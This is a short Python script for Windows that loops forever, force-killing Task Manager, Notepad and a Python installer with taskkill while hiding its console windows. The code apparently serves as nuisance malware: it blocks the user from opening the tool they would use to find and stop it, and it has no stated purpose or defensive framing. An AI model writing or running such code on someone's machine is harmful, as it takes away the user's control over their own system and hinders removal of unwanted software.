import subprocess

while True:
        CREATE_NO_WINDOW = 0x08000000
        subprocess.call('taskkill /F /IM taskmgr.exe', creationflags=CREATE_NO_WINDOW)
        CREATE_NO_WINDOW = 0x08000000
        subprocess.call('taskkill /F /IM notepad.exe', creationflags=CREATE_NO_WINDOW)
        CREATE_NO_WINDOW = 0x08000000
        subprocess.call('taskkill /F /IM python-3.10.2-amd64.exe', creationflags=CREATE_NO_WINDOW)
